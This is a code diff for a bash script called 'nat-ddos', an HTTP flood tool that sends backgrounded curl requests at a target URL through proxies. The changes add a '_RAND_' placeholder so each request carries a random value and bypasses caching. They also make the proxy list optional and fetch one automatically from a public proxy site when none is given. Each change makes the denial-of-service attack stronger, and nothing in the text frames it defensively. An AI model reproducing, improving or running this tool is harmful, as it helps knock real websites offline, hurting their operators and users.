@@ -35,7 +35,7 @@ function attack {
 		else
 			[[ ! -z $cookie_load ]] && cookiestr="-b $cookie_load"
 	fi
-	http_proxy=$p curl $* --max-time $timeout $cookiestr >> /dev/null 2> /dev/null &
+	http_proxy=$p curl $(echo $* | sed -e "s/_RAND_/$RANDOM/g;") --max-time $timeout $cookiestr >> /dev/null 2> /dev/null &
 	done
 }
 
@@ -51,10 +51,13 @@ function genloop {
 }
 
 function usage {
-	echo "usage: nat-ddos --url <target> --proxys <proxy_list>"
+	echo "usage: nat-ddos --url <target> [--proxys <proxy_list>]"
 	echo "                [--nowait] [--rest n] [--killcurl] [--thread n]"
 	echo "                [--load-cookies cookie] [--read-cookies]"
 	echo "                [--proxy-timeout n]"
+	echo 
+	echo "if 'proxy_list' is not defined, will try to fetch one."
+	echo "use '_RAND_' in url to add random variable while attack (bypass chache)."
 	exit 1
 }
 
@@ -71,7 +74,12 @@ timeout=$(echo $* | getarg proxy-timeout)
 [[ -z $thread ]] && thread=5
 [[ -z $timeout ]] && timeout=15
 [[ -z $rest ]] && rest=5
-[[ -z $list || -z $target ]] && usage
+[[ -z $target ]] && usage
+[[ -z $list ]] && {
+	echo "[$(date)] Fecthing proxys... "
+	curl http://txt.proxyspy.net/proxy.txt 2> /dev/null | grep : | awk -F" " '{print $1}' > proxy.txt
+	list=proxy.txt
+}
 
 loopstr=$(genloop)
 rm -fr cookies 2> /dev/null
